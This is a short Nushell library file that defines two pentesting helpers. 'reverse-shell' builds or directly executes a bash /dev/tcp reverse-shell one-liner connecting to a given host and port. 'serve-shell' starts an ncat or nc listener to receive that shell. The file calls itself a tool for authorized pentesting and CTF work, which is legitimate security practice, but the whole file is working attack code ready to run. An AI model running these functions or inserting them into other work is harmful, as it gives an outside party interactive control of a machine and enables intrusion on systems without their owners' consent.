# [nu_lib] Build (or run) a bash reverse-shell one-liner connecting back to `host:port`. For authorized pentesting/CTF use.
export def reverse-shell [host --print(-p)] {
    let h = $host | split row ':'
    let c = $'bash -i >& /dev/tcp/($h.0)/($h.1) 0>&1 2>&1'
    if $print {
        echo $c
    } else {
        bash -c $c
    }
}

# [nu_lib] Listen on `port` for an incoming shell connection, using ncat or nc (whichever is available).
export def serve-shell [port] {
    mut x = ''
    for c in [ncat nc] {
        if (which $c | is-not-empty) {
            $x = $c
            break
        }
    }
    ^$x -lvp $port
}
